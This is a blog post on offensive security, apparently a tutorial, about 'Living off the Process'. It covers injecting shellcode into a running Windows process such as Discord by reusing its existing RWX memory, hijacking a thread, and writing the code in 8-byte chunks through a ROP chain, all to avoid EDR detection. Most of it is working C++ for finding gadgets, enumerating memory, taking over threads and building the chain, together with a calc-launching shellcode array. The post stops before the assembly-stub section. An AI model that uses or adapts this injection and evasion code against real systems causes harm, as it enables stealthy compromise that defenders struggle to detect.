# https://g3tsyst3m.com/lotp/Living-off-the-Process/

Hello again everyone! Hope the start to the new year is treating you well. I am excited to share a new blog post with you! Furthermore, I’d consider the content shared in today’s post to be the most time I’ve spent in researching a particular offensive security topic/technique 😹 I’d say I spent well over a month looking into this exciting topic and I wanted to make sure I had all my research completed before I jumped in to making a post. Without further ado, I give you my take on what I’d like to call: `Living off the Process`! This is a technique that does as the name implies: We use what is already available to us in the remote process of our choosing to accomplish a given goal. In this case, the goal will be to write shellcode indirectly into the remote process with as low of a footprint as possible. When I say indirectly, I mean we won’t be using `WriteProcessMemory` to write the shellcode. That API does play a small role, but ultimately we will be indirectly writing our shellcode in 8 byte chunks using ROP gadgets and assembly stubs all made available in the remote process. We will also avoid the creation of RWX regions of memory. Here’s a quick overview on how it all works. We will be looking for:

- **Existing RWX memory regions already available that were created by the process of interest**
- **Existing ROP gadgets to help us write our shellcode**
- **Hijacking an existing thread within the remote process to manipulate / set register values via SetThreadContext**
- **Using registers, assembly stubs + our collected gadgets to copy shellcode in 8 byte chunks into one of the previously discovered RWX regions of memory (This is the most exciting aspect of the technique in my personal opinion😸)**
- **Set RSP to a fake stack which will point to our hijacked region of memory holding our shellcode and execute the shellcode!**
- **Profit!**

At no point will we use conventional means of writing our shellcode into the remote process with the exception of writing assembly stubs which will contain 8 byte increments of our shellcode. It will all make more sense in due time I promise, just keep on reading 😸 Essentially, we will be truly exhausting all that is already available to the remote process itself. This concept of `Living off the Process` has intrigued me for quite some time. I don’t know how novel the concept really is. I did know this: I knew it was possible and had to dive in and research it to truly understand the capabilities of such a technique. I’m on a modern Windows 11 25h2 with all security features enabled btw. I’ve got a lot of information to cover, so let’s get started!

## So, Living off the Process huh? [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#so-living-off-the-process-huh "Permalink")

Yes! 😆 It may seem overkill to do all the aforementioned prepwork just to copy shellcode into a remote process, but the benefits far outweigh the labor involved. Think about it: If everything that we need is already available to a given process, all we are required to do is to take the existing artifacts and repurpose them for our needs. No need for overusing WriteProcessMemory, VirtualAlloc, injecting a DLL, etc. This way, everything you need to manipulate the remote process is self-contained and already available to the process. Furthermore, we’ll be working with a process that EDR has already blessed 😸 So, just like Living off the Land, we take a similar approach. Using what’s already available to the process, which in turn should lower our EDR footprint on the machine considerably.

## Video Teaser for an In-Depth Technical Walkthrough of this Blog Post [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#video-teaser-for-an-in-depth-technical-walkthrough-of-this-blog-post "Permalink")

Living off the Process - LOTP Video Walkthrough preview - YouTube

[Photo image of R.B.C.](https://www.youtube.com/channel/UC2Q1udfnPuOnr7pBge3YgDA?embeds_referring_euri=https%3A%2F%2Fg3tsyst3m.com%2F)

R.B.C.

47 subscribers

[Living off the Process - LOTP Video Walkthrough preview](https://www.youtube.com/watch?v=6-eOvC7Rh28)

R.B.C.

Search

Watch later

Share

Copy link

Info

Shopping

Tap to unmute

If playback doesn't begin shortly, try restarting your device.

More videos

## More videos

You're signed out

Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.

CancelConfirm

Share

Include playlist

An error occurred while retrieving sharing information. Please try again later.

[Watch on](https://www.youtube.com/watch?v=6-eOvC7Rh28&embeds_referring_euri=https%3A%2F%2Fg3tsyst3m.com%2F)

0:00

0:00 / 5:42

•Live

•

Full In-Depth Walkthrough can be found at my ko-fi shop: 📹 [Ko-Fi Subscribers](https://ko-fi.com/s/35ab60ff88) 📹

## Part - 1: Collecting ROP Gadgets [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#part---1-collecting-rop-gadgets "Permalink")

Since we will be using Registers (you know…RAX, RBX, RCX, RDX, R8, R9, and so on… ) to eventually write our shellcode, we need to find existing ROP gadgets in the process to accomplish this. The most important ROP gadget we will be using is:

```
mov [rax], r8; ret
```

Where `R8` will hold 8-byte chunks of our shellcode and `RAX` will point to the memory address for the shellcode in the remote process. You can use any two registers to handle this, I just so happened to choose these two because they seemed to be available across many of the processes I tested on my Windows 11 box.

So, here’s how it works: We will be copying the initial 8 bytes, then increasing both RAX and R8 by 8 to get the next 8 bytes in memory and the next 8 bytes of shellcode respectively. I soon realized it’s difficult locating `add r8, 8; ret` and `add rax, 8; ret` gadgets. Even `inc r8; ret` and `inc rax; ret` were difficult to locate. So, I went with another angle to accomplish the portion of my ROP gadget chain that would handle the 8 byte increments which you’ll see later. For now, let me show you how I found these gadgets. I’m old school, so I don’t always use Ropper. I like to work exclusively within x64dbg for most of my gadget searching needs these days. Here’s a quick crash course on how to find gadgets using `x64Dbg`:

**Step 1: Choose File, Attach, and find a process you want to search for gadgets in**

![image](https://github.com/user-attachments/assets/6de815b0-87ef-4099-8d69-59f2630a41b0)

**Step 2: Right click on the main window and following the visual below**

![image](https://github.com/user-attachments/assets/6fb34ead-bac1-45cc-8f7c-52790e8bc1fe)

**Step 3: Type in mov \[rax\], r8 in the window that pops up and hit enter. This is so we can understand what the machinecode instructions are for this command**

- **Double-click on any entry from the listed results**

![image](https://github.com/user-attachments/assets/2a9cbcba-4778-4595-be96-87588e192c24)

**Copy the machinecode/shellcode!**

![image](https://github.com/user-attachments/assets/8dcc13e0-f00f-4686-8b2e-f1ed7477c4f6)

**Next, we need to find the gadget with the `ret` command included. so, mov \[rax\], r8; ret. We can do that easily enough. Follow along with the visuals below to use the Pattern Search feature in x64dbg:**

![image](https://github.com/user-attachments/assets/8308be32-be12-45c0-b39e-3160259f78f2)

**Type in the machine code values you acquired earlier: \`4C 89 00 C3’ (C3 = ret in machine code) and hit enter**

![image](https://github.com/user-attachments/assets/12b3e7c6-b490-4d8c-a195-e7e24b7855ea)

**Double-click on any you find in the returned results:**

![image](https://github.com/user-attachments/assets/789ac61a-931e-4c40-9c6d-1daea57814fb)

You should see your ROP gadget and the module it was found in! This confirms that particular gadget lives in this process. W00t!

![image](https://github.com/user-attachments/assets/b11c9229-1e95-4be7-9a40-4c458438ab22)

That’s it! Now that you know how to find gadgets, you’re good to go. Let me show you the code for using them now. You’ll see we add in our machine code instructions we found in x64dbg. Machine code is the lowest level form of Assembly code. so in the case of `mov [rax], r8; ret',`0x4C, 0x89, 0x00, 0xC3\` = machine code representation of the assembly code instructions. I should have said that earlier but alas I got ahead of myself 😸

```

    DWORD pid = (DWORD)atoi(argv[1]);
    std::wcout << L"[*] Target PID: " << pid << std::endl;

    // Find gadgets (in order of execution)
    BYTE gadget0[] = { 0xC3 }; // ret
    PVOID pgadget0 = FindGadget(pid, gadget0, sizeof(gadget0), "ret");
    if (!pgadget0)
    {
        std::wcout << L"[-] Could not locate any gadgets for: ret" << std::endl;
        return 1;
    }
    BYTE gadget3[] = { 0x4C, 0x89, 0x00, 0xC3 }; // mov [rax], r8; ret
    PVOID pgadget3 = FindGadget(pid, gadget3, sizeof(gadget3), "mov [rax], r8; ret");
    if (!pgadget3)
    {
        std::wcout << L"[-] Could not locate any gadgets for mov [rax], r8; ret" << std::endl;
        return 1;
    }
    BYTE gadget12[] = { 0x5C, 0xC3 }; // pop rsp; ret  (go with a non-volatile register)
    PVOID pgadget12 = FindGadget(pid, gadget12, sizeof(gadget12), "pop rsp; ret ");
    if (!pgadget12)
    {
        std::wcout << L"[-] Could not locate any gadgets for pop rsp; ret " << std::endl;
        return 1;
    }
```

**And the FindGadget() function that finds the memory address for each gadget!**

```
PVOID FindGadget(DWORD pid, const BYTE* gadget, SIZE_T gadgetSize, const char* description) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) return nullptr;

    HMODULE hMods[1024];
    DWORD cbNeeded;
    PVOID gadgetAddress = nullptr;

    std::wcout << L"[*] Searching for " << description << L"..." << std::endl;

    if (EnumProcessModulesEx(hProcess, hMods, sizeof(hMods), &cbNeeded, LIST_MODULES_ALL)) {
        for (int i = 0; i < (int)(cbNeeded / sizeof(HMODULE)) && !gadgetAddress; ++i) {
            MODULEINFO modInfo;
            WCHAR modName[MAX_PATH];
            if (!GetModuleInformation(hProcess, hMods[i], &modInfo, sizeof(modInfo)) ||
                !GetModuleBaseNameW(hProcess, hMods[i], modName, MAX_PATH)) continue;

            MEMORY_BASIC_INFORMATION mbi{};
            for (BYTE* addr = (BYTE*)modInfo.lpBaseOfDll; addr < (BYTE*)modInfo.lpBaseOfDll + modInfo.SizeOfImage; ) {
                if (!VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi))) break;
                if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
                    BYTE* buffer = new BYTE[mbi.RegionSize];
                    SIZE_T bytesRead;
                    if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead)) {
                        for (SIZE_T j = 0; j + gadgetSize <= bytesRead; ++j) {
                            if (memcmp(buffer + j, gadget, gadgetSize) == 0) {
                                gadgetAddress = (PVOID)((uintptr_t)mbi.BaseAddress + j);
                                std::wcout << L"[+] Found in " << modName << L" at 0x" << std::hex << gadgetAddress << " !!!" << std::dec << std::endl;
                                delete[] buffer;
                                CloseHandle(hProcess);
                                return gadgetAddress;
                            }
                        }
                    }
                    delete[] buffer;
                }
                addr += mbi.RegionSize;
            }
        }
    }
    CloseHandle(hProcess);
    return gadgetAddress;
}
```

That’s a wrap for gadget searching! Let’s move on to the next requirement for leveraging all the possibilities of LOTP (Living off the Process), finding already created RWX memory regions

## Finding existing RWX memory within the remote Process [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#finding-existing-rwx-memory-within-the-remote-process "Permalink")

This portion of our `LOTP` artifact searching doesn’t require too much effort. In fact, you can easily check for already created RWX (Read/Write/Execute) memory regions via SystemInformer. This is probably the easiest artifacts to check as far as Living off the Process goes. There’s more processes that use RWX than you probably realize 😺 Here’s how to do it. I’ll be picking on the Discord process as it is a great candidate 😸

**System Informer**

![image](https://github.com/user-attachments/assets/f9ed3903-3e81-433a-afe1-8fb9157091fe)

Now, we want to do the same thing but programatically right? I’ll share the code to accomplish this below:

```
// Open process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
if (!hProcess) {
    std::wcout << L"[!] Failed to open process (Error: " << GetLastError() << L")" << std::endl;
    return 1;
}

std::wcout << L"[+] Successfully opened process handle" << std::endl;

LPVOID remoteShellcode = nullptr;
LPVOID remoteGadgets = nullptr;
// Find all RWX memory regions
std::wcout << L"\n[*] Scanning for RWX memory regions (4KB only)..." << std::endl;

int reval=FindRWXMemoryRegions(shellcode_base, hProcess, remoteShellcode, remoteGadgets);
```

Now, let me show you the `FindRWXMemoryRegions` function itself. We start by looking through all user modules for pre-allocated RWX memory regions. Then once regions are detected, I added the option for you the user to specify which region is going to serve as the gadgets memory region, the shellcode memory region, and the fake stack memory regions. If no RWX regions are found, then I added an alternative default to automatically create the necessary RWX regions. I realize this is counter to the whole notion of LOTP but the functionality is there if you want to use it. Also, the fake stack memory region always needs to be at least 0x4000 in size or greater. So when you pick a memory region, bear that in mind. 🐻 The reason being, well there’s two primary reasons. API’s use up a lot of stack space and I want to make sure when we execute our shellcode we have enough space for that. Also, I want a clean stack that isn’t clobber by preexisting data from the process we injected into.

```
int FindRWXMemoryRegions(unsigned char* shellcode_base, HANDLE hProcess,
    LPVOID& remoteShellcode, LPVOID& remoteGadgets, LPVOID& remoteStack)
{
    // Note: Requires #include <algorithm> for std::sort

    struct RWXRegion {
        PVOID baseAddress;
        SIZE_T size;
        std::wstring info;
    };

    std::vector<RWXRegion> rwxRegions;
    MEMORY_BASIC_INFORMATION mbi;
    PVOID address = nullptr;

    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        // Check for RWX (PAGE_EXECUTE_READWRITE) regions with size greater than or equal to 0x1000
        if (mbi.State == MEM_COMMIT &&
            mbi.Protect == PAGE_EXECUTE_READWRITE &&
            mbi.RegionSize >= 0x1000) {

            RWXRegion region;
            region.baseAddress = mbi.BaseAddress;
            region.size = mbi.RegionSize;

            // Try to get module name for this region
            HMODULE hMod;
            WCHAR modName[MAX_PATH] = L"<Unknown>";
            if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
                (LPCWSTR)mbi.BaseAddress, &hMod)) {
                GetModuleFileNameW(hMod, modName, MAX_PATH);
            }

            region.info = modName;
            rwxRegions.push_back(region);
        }

        // Move to next region
        address = (PVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
    }

    // Sort regions by size (largest first) to ensure stack gets the largest region
    std::sort(rwxRegions.begin(), rwxRegions.end(),
        [](const RWXRegion& a, const RWXRegion& b) {
            return a.size > b.size;
        });

    if (rwxRegions.empty()) {
        std::wcout << L"[!] No RWX regions found (>=4KB)! Falling back to VirtualAllocEx..." << std::endl;
        remoteShellcode = VirtualAllocEx(hProcess, NULL, 0x1000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!remoteShellcode) {
            std::wcout << L"[!] VirtualAllocEx failed (Error: " << GetLastError() << L")" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        std::wcout << L"[+] Allocated shellcode memory at: 0x" << std::hex << remoteShellcode << std::dec << std::endl;

        // Allocate separate region for gadgets
        remoteGadgets = VirtualAllocEx(hProcess, NULL, 0x1000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!remoteGadgets) {
            std::wcout << L"[!] VirtualAllocEx for gadgets failed (Error: " << GetLastError() << L")" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        std::wcout << L"[+] Allocated gadgets memory at: 0x" << std::hex << remoteGadgets << std::dec << std::endl;

        // Allocate separate region for clean stack
        remoteStack = VirtualAllocEx(hProcess, NULL, 0x10000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!remoteStack) {
            std::wcout << L"[!] VirtualAllocEx for stack failed (Error: " << GetLastError() << L")" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        std::wcout << L"[+] Allocated stack memory at: 0x" << std::hex << remoteStack << std::dec << std::endl;
    }
    else if (rwxRegions.size() < 3) {
        std::wcout << L"\n[+] Found only " << rwxRegions.size() << L" RWX region(s) (need 3 for shellcode + gadgets + stack)" << std::endl;
        std::wcout << L"[*] Using found regions and allocating remaining..." << std::endl;
        std::wcout << L"============================================================" << std::endl;

        for (size_t i = 0; i < rwxRegions.size(); ++i) {
            std::wcout << L"[" << i + 1 << L"] Address: 0x" << std::hex << std::setfill(L'0') << std::setw(16)
                << rwxRegions[i].baseAddress << L" | Size: 0x" << rwxRegions[i].size << std::dec
                << L" (" << rwxRegions[i].size << L" bytes)" << std::endl;
            std::wcout << L"    Module: " << rwxRegions[i].info << std::endl;
        }
        std::wcout << L"============================================================" << std::endl;

        // Assign found regions - prioritize stack first, then gadgets, then shellcode
        if (rwxRegions.size() >= 1) {
            remoteStack = rwxRegions[0].baseAddress;
            std::wcout << L"\n[+] Using RWX region for stack at: 0x" << std::hex << remoteStack << std::dec << std::endl;
        }

        if (rwxRegions.size() >= 2) {
            remoteGadgets = rwxRegions[1].baseAddress;
            std::wcout << L"[+] Using RWX region for gadgets at: 0x" << std::hex << remoteGadgets << std::dec << std::endl;
        }

        // Allocate remaining needed regions
        if (rwxRegions.size() < 1) {
            remoteStack = VirtualAllocEx(hProcess, NULL, 0x10000,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remoteStack) {
                std::wcout << L"[!] VirtualAllocEx for stack failed (Error: " << GetLastError() << L")" << std::endl;
                CloseHandle(hProcess);
                return 1;
            }
            std::wcout << L"[+] Allocated stack memory at: 0x" << std::hex << remoteStack << std::dec << std::endl;
        }

        if (rwxRegions.size() < 2) {
            remoteGadgets = VirtualAllocEx(hProcess, NULL, 0x1000,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remoteGadgets) {
                std::wcout << L"[!] VirtualAllocEx for gadgets failed (Error: " << GetLastError() << L")" << std::endl;
                CloseHandle(hProcess);
                return 1;
            }
            std::wcout << L"[+] Allocated gadgets memory at: 0x" << std::hex << remoteGadgets << std::dec << std::endl;
        }

        // Always need to allocate shellcode since we have less than 3
        remoteShellcode = VirtualAllocEx(hProcess, NULL, 0x1000,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteShellcode) {
            std::wcout << L"[!] VirtualAllocEx for shellcode failed (Error: " << GetLastError() << L")" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }
        std::wcout << L"[+] Allocated shellcode memory at: 0x" << std::hex << remoteShellcode << std::dec << std::endl;
    }
    else {
        std::wcout << L"\n[+] Found " << rwxRegions.size() << L" RWX memory region(s) (sorted by size, largest first):" << std::endl;
        std::wcout << L"============================================================" << std::endl;

        for (size_t i = 0; i < rwxRegions.size(); ++i) {
            std::wcout << L"[" << i + 1 << L"] Address: 0x" << std::hex << std::setfill(L'0') << std::setw(16)
                << rwxRegions[i].baseAddress << L" | Size: 0x" << rwxRegions[i].size << std::dec
                << L" (" << rwxRegions[i].size << L" bytes)" << std::endl;
            std::wcout << L"    Module: " << rwxRegions[i].info << std::endl;
        }

        std::wcout << L"============================================================" << std::endl;

        // Select region for shellcode
        std::wcout << L"\n[?] Select region for SHELLCODE (1-" << rwxRegions.size() << L"): ";
        int shellcodeChoice;
        std::cin >> shellcodeChoice;
        std::cin.ignore();

        if (shellcodeChoice < 1 || shellcodeChoice >(int)rwxRegions.size()) {
            std::wcout << L"[!] Invalid choice!" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        remoteShellcode = rwxRegions[shellcodeChoice - 1].baseAddress;
        std::wcout << L"[+] Shellcode region selected: 0x" << std::hex << remoteShellcode << std::dec << std::endl;

        // Select region for gadgets
        std::wcout << L"\n[?] Select region for GADGETS (1-" << rwxRegions.size() << L", different from "
            << shellcodeChoice << L"): ";
        int gadgetsChoice;
        std::cin >> gadgetsChoice;
        std::cin.ignore();

        if (gadgetsChoice < 1 || gadgetsChoice >(int)rwxRegions.size() || gadgetsChoice == shellcodeChoice) {
            std::wcout << L"[!] Invalid choice (must be different from shellcode region)!" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        remoteGadgets = rwxRegions[gadgetsChoice - 1].baseAddress;
        std::wcout << L"[+] Gadgets region selected: 0x" << std::hex << remoteGadgets << std::dec << std::endl;

        // Select region for clean stack
        std::wcout << L"\n[?] Select region for CLEAN STACK [!!!You must choose a region with size >= 0x4000 (16kb) !!!] (1-" << rwxRegions.size() << L", different from "
            << shellcodeChoice << L" and " << gadgetsChoice << L"): ";
        int stackChoice;
        std::cin >> stackChoice;
        std::cin.ignore();

        if (stackChoice < 1 || stackChoice >(int)rwxRegions.size() ||
            stackChoice == shellcodeChoice || stackChoice == gadgetsChoice) {
            std::wcout << L"[!] Invalid choice (must be different from shellcode and gadgets regions)!" << std::endl;
            CloseHandle(hProcess);
            return 1;
        }

        remoteStack = rwxRegions[stackChoice - 1].baseAddress;
        std::wcout << L"[+] Stack region selected: 0x" << std::hex << remoteStack << std::dec << std::endl;

        std::wcout << L"\n[*] Memory allocation summary:" << std::endl;
        std::wcout << L"    Shellcode: 0x" << std::hex << remoteShellcode << std::dec << std::endl;
        std::wcout << L"    Gadgets:   0x" << std::hex << remoteGadgets << std::dec << std::endl;
        std::wcout << L"    Stack:     0x" << std::hex << remoteStack << std::dec << std::endl;
    }

    return 0;
}
```

Okay, so now we have our ROP gadgets identified and our lookup function ready to go, as well as our RWX memory lookup function. Let’s continue building this out!

Next up, hijacking a thread 🧵

## Hijacking an existing Thread [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#hijacking-an-existing-thread "Permalink")

I went back and forth on this one. I thought about whether I wanted to just get the first thread we encounter in our thread lookup routine or specifically get just worker threads. Believe it or not, worker threads sometimes took forever to execute the final shellcode. So, I just stuck with using the first thread returned from a basic lookup. Here’s what that looks like in System Informer when we hijack a thread and suspend it. Notice the odd memory address that stands out in the hijacked thread. That’s us! 😺

![image](https://github.com/user-attachments/assets/4e304d26-761f-4782-ab2f-85cbd52b5722)

Now for the code. In the code below, we grab a snapshot of all running threads and then sift through them all, looking for the first thread that matches our remote PID (processID) and return it! It’s as simple as that. Once we return the found thread, I added some code to output what the threadId was so you can look it up yourself in System Informer if you like 😸

```
DWORD FindThreadId(DWORD pid) {
    THREADENTRY32 te{};
    te.dwSize = sizeof(te);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                CloseHandle(snap);
                return te.th32ThreadID;
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return 0;
}
```

The code below calls the `FindThreadID` function and then opens the hijacked thread, saving the handle to `hThread`.

```
DWORD tid = FindThreadId(pid);
if (!tid) {
    std::cerr << "Failed to find thread\n";
    return 1;
}
else
{
    std::cout << "Thread Id found!  ThreadID:" << tid << std::endl;
}

HANDLE hThread = OpenThread(
    THREAD_ALL_ACCESS,
    FALSE,
    tid
);

if (!hThread) {
    std::cerr << "OpenThread failed\n";
    return 1;
}
```

At this point, we have accomplished the following tasks as it pertains to LOTP artifacts:

- **Using existing, running/active code within the process itself as ROP gadgets**
- **Use of existing/already created RWX memory**
- **Hijacking an existing Thread in the remote process**

Let’s get a visual for what that looks like shall we? So, here’s where we find the gadgets using our compiled code (I’ll share the full code later I promise 😸):

![image](https://github.com/user-attachments/assets/860ae69b-37b2-473d-93eb-11faa6ff38ad)

Next up, we need to pick the discovered RWX regions of memory available to the process. I’m targeting `Discord.exe` as it’s very generous with providing pre-existing RWX memory 😺 Go ahead and follow the input prompts make your selections. Just make sure when you pick the fake `stack memory`, that you pick an entry that is listed as `0x4000` or greater. I’ve highlighted them in the visual below:

![image](https://github.com/user-attachments/assets/731ecd92-7cb1-4298-937b-35e924081626)

Once you make your selection, our program will then assign each respective allocated memory region to the appropriate variable. We will also hijack the first thread we come across in the remote process. Here’s how my selection process went:

![image](https://github.com/user-attachments/assets/92618f1e-e703-48ba-a4ff-b55a39281e64)

Next up, we need to build out our `ROP chain` and also generate some `assembly stubs` to handle increasing our `RAX` and `R8` register by 8 so we can cycle through all our shellcode in 8-byte chunks. We also need to add the 8-byte shellcode chunks to our dedicated shellcode memory region, moving to the next 8th byte in memory until we write all the shellcode. Oh, and it would help if I let you see the shellcode we’re using too 😆 I’ll show you that in the next section. Let’s go!

## Building out the ROP Chain [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#building-out-the-rop-chain "Permalink")

Okay, so now we are ready to start building out our ROP chain using the previously collected ROP gadgets, as well as creating some small assembly stubs to help with keeping track of where we are in our 8 byte shellcode chunks. We also need to keep track of the memory address we’re copying/writing our shellcode stubs to. It will also increment by 8 bytes. Before I forget, here’s the shellcode we will be working with and copying in 8 byte chunks:

It’s just some custom shellcode I wrote myself that executes the Windows Calculator:

```
unsigned char shellcode_base[] =
{ 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x31, 0xc9, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x60, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x70, 0x10, 0x48, 0x8b, 0x36, 0x48, 0x8b, 0x4e, 0x60, 0x48, 0x8b, 0x19, 0x48, 0xba, 0x4b, 0x00, 0x45, 0x00, 0x52, 0x00, 0x4e, 0x00, 0x48, 0x39, 0xd3, 0x74, 0x02, 0x75, 0xe5, 0x48, 0x8b, 0x5e, 0x30, 0x49, 0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x44, 0x8b, 0x52, 0x14, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4c, 0x89, 0xd1, 0x48, 0xb8, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x6f, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe0, 0x08, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x48, 0x89, 0xe0, 0x48, 0x83, 0xc4, 0x08, 0x67, 0xe3, 0x16, 0x31, 0xdb, 0x41, 0x8b, 0x1c, 0x8b, 0x4c, 0x01, 0xc3, 0x48, 0xff, 0xc9, 0x4c, 0x8b, 0x08, 0x4c, 0x39, 0x0b, 0x74, 0x03, 0x75, 0xe7, 0xcc, 0xff, 0xc1, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x1c, 0x4d, 0x01, 0xc3, 0x45, 0x8b, 0x3c, 0x8b, 0x4d, 0x01, 0xc7, 0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1, 0x48, 0x31, 0xd2, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x30, 0x41, 0xff, 0xd7 };
```

We start out by determining how many 8-byte chunks we need to create and also preparing our assembly stubs. I’ll explain those in greater detail soon. Both the ROP gadget chain and assembly stubs will be present within the gadget allocated memory region. The gadgets will be at and the assembly stubs will be at `remoteGadgets + 0x800`. Let’s check it out with some visuals and I’ll also include code to follow along with after the visuals.

![image](https://github.com/user-attachments/assets/d0407aa1-02c6-4da8-8679-c6846a235b0e)

At this point I’ve went into SystemInformer and opened up the Discord process running under PID 9292, navigated to the `Memory` tab, and copy and pasted the value for our `gadgets` memory address.

![image](https://github.com/user-attachments/assets/8d90286f-fadb-4cd8-8354-26e328df86c5)

Double-click on the memory region once it shows up and you’ll see the entire ROP chain of all our gadgets, most of which are comprised of this gadget: `mov [rax], r8; ret` and the final `pop rsp, ret`

In between each gadget address is the placeholder address for our assembly stub code cave

![image](https://github.com/user-attachments/assets/244bcf78-37a3-499f-b290-a7c0aa8e466b)

I can attach x64dbg to Discord and go to the first gadget address and see it does in fact point to our `mov [rax], r8; ret` gadget! The stub address we won’t go to just yet.

![image](https://github.com/user-attachments/assets/0348fea9-f49d-4fbd-a91a-22c2b83c043d)

By the way, the final `pop rsp; ret` gadget (see code snippet below) will pop the address of the fake stack which will be pointing to the address of our shellcode after it’s written 😺 Sort of my inventive way of using a clean stack while executing shellcode in another memory region.

```
// After all the write gadgets...
ropChain.push_back((DWORD64)pgadget12);  // pop rsp; ret
ropChain.push_back((DWORD64)safeStack);  // Set RSP to safe stack
// Now ret will pop the remoteShellcode address from safeStack + 0x3F00 and jump to the shellcode!
```

Here’s the code for this entire section we’ve just covered above:

```
//**********************************************************
// ROP Gadgets Prepwork
//**********************************************************
    std::wcout << L"\n[*] Building ROP chain with code caves for our assembly stubs..." << std::endl;

    // Calculate sizes
    size_t addr_size = sizeof(void*);
    size_t base_size = sizeof(shellcode_base);
    unsigned char* shellcode = shellcode_base;

    // Calculate number of 8-byte chunks
    size_t numChunks = (base_size + 7) / 8;
    std::wcout << L"[*] Shellcode size: " << base_size << L" bytes ("
        << numChunks << L" chunks)" << std::endl;

    // Allocate memory for code stubs within gadgets region
    // Each stub needs ~21 bytes, opting to use 32 for safety and alignment
    SIZE_T stubsSize = numChunks * 32;
    LPVOID codeStubs = (LPVOID)((uintptr_t)remoteGadgets + 0x800); // Offset within gadgets region

    std::wcout << L"[*] Code stubs will be at: 0x" << std::hex << codeStubs << std::dec << std::endl;

    //********************************************
    // Build ROP chain
    //********************************************
    std::vector<DWORD64> ropChain;
    uintptr_t stubAddr = (uintptr_t)codeStubs;

    for (size_t i = 0; i < numChunks; i++) {
        if (i > 0) {  // Skip first stub in ROP chain (executed via RIP)
            ropChain.push_back(stubAddr);
        }
        ropChain.push_back((DWORD64)pgadget3);     // mov [rax], r8; ret
        stubAddr += 32;
    }

    // After all the write gadgets...
    ropChain.push_back((DWORD64)pgadget12);  // pop rsp; ret
    ropChain.push_back((DWORD64)safeStack);  // Set RSP to safe stack
    // Now ret will pop the remoteShellcode address from safeStack + 0x3F00 and jump to the shellcode!

    std::wcout << L"[*] ROP chain: " << ropChain.size() << " entries" << std::endl;
    //********************************************

    // Write ROP chain to start of gadgets region
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteGadgets, ropChain.data(),
        ropChain.size() * sizeof(DWORD64), &bytesWritten)) {
        std::wcout << L"[!] WriteProcessMemory (ROP chain) failed: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    std::wcout << L"[+] ROP chain written! (" << bytesWritten << L" bytes)" << std::endl;
    std::cin.get();
```

Next up, we need to write our assembly stubs which will increment both RAX and R8 registers by 8 so each time we write our shellcode chunks (8 byte chunks), we go to the next shellcode chunk and next 8 bytes in memory for the shellcode memory address, respectively.

## Writing the Assembly Stubs for RAX and R8 [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#writing-the-assembly-stubs-for-rax-and-r8 "Permalink")

